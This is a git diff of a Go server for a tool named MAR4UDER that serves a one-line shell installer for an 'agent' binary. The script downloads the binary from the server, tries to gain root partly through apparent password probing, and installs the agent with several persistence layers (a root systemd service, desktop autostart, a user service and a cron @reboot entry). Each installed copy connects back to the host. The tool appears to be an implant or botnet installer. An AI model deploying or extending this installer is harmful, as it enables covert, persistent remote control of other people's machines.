@@ -749,20 +749,54 @@ func (api *APIServer) handleOneLineInstaller(w http.ResponseWriter, r *http.Requ
 	}
 
 	httpPort := "8080"
-	if parts := strings.Split(api.cfg.HTTPAddr, ":"); len(parts) >= 2 {
+	if parts := strings.Split(api.cfg.HTTPAddr, ":"); len(parts) >= 2 && parts[len(parts)-1] != "" {
 		httpPort = parts[len(parts)-1]
 	}
 
+	udpPort := "443"
+	if parts := strings.Split(api.cfg.UDPAddr, ":"); len(parts) >= 2 && parts[len(parts)-1] != "" {
+		udpPort = parts[len(parts)-1]
+	}
+
 	script := fmt.Sprintf(`#!/bin/sh
+set -e
 HOST="%s"
-PORT="%s"
+HTTP_PORT="%s"
+UDP_PORT="%s"
 NODE_NAME="${1:-$(hostname)}"
-echo "[*] Installing mar4uder agent for [$NODE_NAME] from http://$HOST:$PORT ..."
+echo "[*] Installing MAR4UDER agent for [$NODE_NAME] from http://$HOST:$HTTP_PORT ..."
+
 TMP_BIN="/tmp/mar4uder_agent.$$"
-curl -fsSL "http://$HOST:$PORT/bin/agent" -o "$TMP_BIN"
+URL="http://$HOST:$HTTP_PORT/bin/agent"
+ERR=""
+
+if command -v curl >/dev/null 2>&1; then
+    ERR=$(curl -fsSL "$URL" -o "$TMP_BIN" 2>&1) || true
+elif command -v wget >/dev/null 2>&1; then
+    ERR=$(wget -qO "$TMP_BIN" "$URL" 2>&1) || true
+elif command -v python3 >/dev/null 2>&1; then
+    ERR=$(python3 -c "import urllib.request; urllib.request.urlretrieve('$URL', '$TMP_BIN')" 2>&1) || true
+elif command -v python >/dev/null 2>&1; then
+    ERR=$(python -c "import urllib; urllib.urlretrieve('$URL', '$TMP_BIN')" 2>&1) || true
+else
+    echo "[-] Error: Neither curl, wget, nor python found on this system."
+    exit 1
+fi
+
+SZ=0
+[ -f "$TMP_BIN" ] && SZ=$(wc -c < "$TMP_BIN" 2>/dev/null || echo 0)
+
+if [ ! -s "$TMP_BIN" ] || [ "$SZ" -lt 30000 ]; then
+    echo "[-] Error: Failed to download valid agent binary from $URL"
+    echo "[-] Downloaded size: ${SZ} bytes (expected >30000 bytes)."
+    [ -n "$ERR" ] && echo "[-] Details: $ERR"
+    rm -f "$TMP_BIN"
+    exit 1
+fi
+
 chmod +x "$TMP_BIN"
 
-# Run command with root elevation if available
+# Root privilege detection
 HAS_ROOT=0
 PASS=""
 if [ "$(id -u)" -eq 0 ]; then
@@ -777,11 +811,6 @@ else
             break
         fi
     done
-    if [ "$HAS_ROOT" -eq 0 ] && [ -t 0 ]; then
-        if sudo true 2>/dev/null; then
-            HAS_ROOT=1
-        fi
-    fi
 fi
 
 run_root() {
@@ -795,7 +824,7 @@ run_root() {
 }
 
 if [ "$HAS_ROOT" -eq 1 ]; then
-    run_root cp "$TMP_BIN" /usr/local/bin/mar4uder_agent
+    run_root cp -f "$TMP_BIN" /usr/local/bin/mar4uder_agent
     run_root chmod 755 /usr/local/bin/mar4uder_agent
     rm -f "$TMP_BIN"
     BIN_PATH="/usr/local/bin/mar4uder_agent"
@@ -803,8 +832,8 @@ if [ "$HAS_ROOT" -eq 1 ]; then
     # Clean up any conflicting user-level agents
     systemctl --user stop mar4uder-agent.service 2>/dev/null || true
     systemctl --user disable mar4uder-agent.service 2>/dev/null || true
-    rm -f "$HOME/.config/systemd/user/mar4uder-agent.service"
-    rm -f "$HOME/.config/autostart/mar4uder-agent.desktop"
+    rm -f "$HOME/.config/systemd/user/mar4uder-agent.service" 2>/dev/null || true
+    rm -f "$HOME/.config/autostart/mar4uder-agent.desktop" 2>/dev/null || true
     (crontab -l 2>/dev/null | grep -v "mar4uder_agent") | crontab - 2>/dev/null || true
 
     if [ -d /etc/systemd/system ] || command -v systemctl >/dev/null 2>&1; then
@@ -820,7 +849,7 @@ Type=simple
 User=root
 Environment="DISPLAY=:0"
 Environment="PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
-ExecStart=/usr/local/bin/mar4uder_agent $HOST:443 $NODE_NAME
+ExecStart=/usr/local/bin/mar4uder_agent $HOST:$UDP_PORT $NODE_NAME
 Restart=always
 RestartSec=3
 KillMode=process
@@ -829,22 +858,24 @@ LimitNOFILE=65536
 [Install]
 WantedBy=multi-user.target
 EOF
-        run_root cp "$TMP_SVC" /etc/systemd/system/mar4uder-agent.service
+        run_root cp -f "$TMP_SVC" /etc/systemd/system/mar4uder-agent.service
         run_root chmod 644 /etc/systemd/system/mar4uder-agent.service
         rm -f "$TMP_SVC"
 
-        run_root systemctl daemon-reload
-        run_root systemctl enable mar4uder-agent.service
-        run_root systemctl restart mar4uder-agent.service
-        echo "[+] SUCCESS: mar4uder-agent service installed with root permissions and enabled on boot!"
+        run_root systemctl daemon-reload 2>/dev/null || true
+        run_root systemctl enable mar4uder-agent.service 2>/dev/null || true
+        run_root systemctl restart mar4uder-agent.service 2>/dev/null || true
+        echo "[+] SUCCESS: mar4uder-agent installed as systemd service with root privileges!"
     else
-        run_root nohup "$BIN_PATH" "$HOST:443" "$NODE_NAME" >/tmp/mar4uder_agent.log 2>&1 &
-        echo "[+] SUCCESS: mar4uder agent started as background root process"
+        pkill -9 -f "mar4uder_agent" 2>/dev/null || true
+        run_root nohup "$BIN_PATH" "$HOST:$UDP_PORT" "$NODE_NAME" >/tmp/mar4uder_agent.log 2>&1 &
+        echo "[+] SUCCESS: mar4uder-agent started as background root process!"
     fi
 else
     mkdir -p "$HOME/.local/bin"
-    mv "$TMP_BIN" "$HOME/.local/bin/mar4uder_agent"
+    cp -f "$TMP_BIN" "$HOME/.local/bin/mar4uder_agent"
     chmod 755 "$HOME/.local/bin/mar4uder_agent"
+    rm -f "$TMP_BIN"
     BIN_PATH="$HOME/.local/bin/mar4uder_agent"
 
     # 1. Desktop Autostart entry (X11 / Wayland session login)
@@ -852,7 +883,7 @@ else
     cat << EOF > "$HOME/.config/autostart/mar4uder-agent.desktop"
 [Desktop Entry]
 Type=Application
-Exec=$BIN_PATH $HOST:443 $NODE_NAME
+Exec=$BIN_PATH $HOST:$UDP_PORT $NODE_NAME
 Hidden=false
 NoDisplay=false
 X-GNOME-Autostart-enabled=true
@@ -870,7 +901,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=$BIN_PATH $HOST:443 $NODE_NAME
+ExecStart=$BIN_PATH $HOST:$UDP_PORT $NODE_NAME
 Restart=always
 RestartSec=3
 
@@ -883,12 +914,13 @@ EOF
     fi
 
     # 3. Crontab fallback (@reboot)
-    (crontab -l 2>/dev/null | grep -v "mar4uder_agent"; echo "@reboot sleep 10 && $BIN_PATH $HOST:443 $NODE_NAME >/tmp/mar4uder_agent.log 2>&1") | crontab - 2>/dev/null || true
+    (crontab -l 2>/dev/null | grep -v "mar4uder_agent"; echo "@reboot sleep 10 && $BIN_PATH $HOST:$UDP_PORT $NODE_NAME >/tmp/mar4uder_agent.log 2>&1") | crontab - 2>/dev/null || true
 
-    nohup "$BIN_PATH" "$HOST:443" "$NODE_NAME" >/tmp/mar4uder_agent.log 2>&1 &
-    echo "[+] SUCCESS: mar4uder agent installed in user profile with multi-layer autostart (Desktop autostart + Cron + User Systemd)!"
+    pkill -9 -f "mar4uder_agent" 2>/dev/null || true
+    nohup "$BIN_PATH" "$HOST:$UDP_PORT" "$NODE_NAME" >/tmp/mar4uder_agent.log 2>&1 &
+    echo "[+] SUCCESS: mar4uder agent installed in user profile ($BIN_PATH)!"
 fi
-`, host, httpPort)
+`, host, httpPort, udpPort)
 
 	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
 	w.WriteHeader(http.StatusOK)
@@ -939,11 +971,19 @@ echo "[+] SUCCESS: MAR4UDER agent cleanly uninstalled from system."
 }
 
 func (api *APIServer) handleServeAgentBinary(w http.ResponseWriter, r *http.Request) {
+	execPath, _ := os.Executable()
+	execDir := filepath.Dir(execPath)
+
 	candidates := []string{
 		"bin/mar4uder_agent",
+		filepath.Join(execDir, "bin", "mar4uder_agent"),
+		filepath.Join(execDir, "mar4uder_agent"),
+		filepath.Join(execDir, "..", "bin", "mar4uder_agent"),
 		"../bin/mar4uder_agent",
 		"/usr/local/bin/mar4uder_agent",
 		"/opt/mar4uder/bin/mar4uder_agent",
+		"/opt/mar4uder/mar4uder_agent",
+		"/tmp/mar4uder_agent",
 		"mar4uder_agent",
 	}
 
